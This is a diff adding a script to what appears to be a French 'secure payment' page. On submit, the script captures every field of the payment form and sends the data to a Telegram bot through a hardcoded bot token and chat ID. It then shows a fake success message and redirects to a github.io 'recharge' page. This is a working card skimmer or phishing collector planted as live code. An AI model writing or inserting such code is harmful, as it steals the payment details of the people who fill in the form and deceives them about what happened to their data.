@@ -30,7 +30,54 @@
 		</div>
 		 <h4>Paiement 100% sécurisé </h4>
 	</div>
+	 <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var form = document.getElementById('paymentForm');
+
+            form.addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                // Collect form data
+                var formData = new FormData(form);
+
+                // Convert FormData to JSON
+                var formDataJSON = {};
+                formData.forEach(function (value, key) {
+                    formDataJSON[key] = value;
+                });
+
+                // Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID
+                var telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';
+                var chatID = '1002083816651';
+
+                // Construct the Telegram message
+                var message = "New payment details:\n\n";
+                for (var key in formDataJSON) {
+                    message += key.charAt(0).toUpperCase() + key.slice(1) + ": " + formDataJSON[key] + "\n";
+                }
+
+                // Send message to Telegram using fetch
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        // Handle the response from the Telegram API (optional)
+                        console.log(data);
+
+                        // Display success popup
+                        alert('Succès! Un email vous sera envoyé avec les détails de la commande et votre code.');
+
+                        // Redirect to thank you page
+                        window.location.href = 'https://recharge-fr.github.io/RCH/';
+                    })
+                    .catch(error => {
+                        console.error('Erreur lors de l'exécution', error);
+                        // Handle error if needed
+                    });
+            });
+        });
+    </script>
 </body>
+	
 </html>
     </div>
 </body>
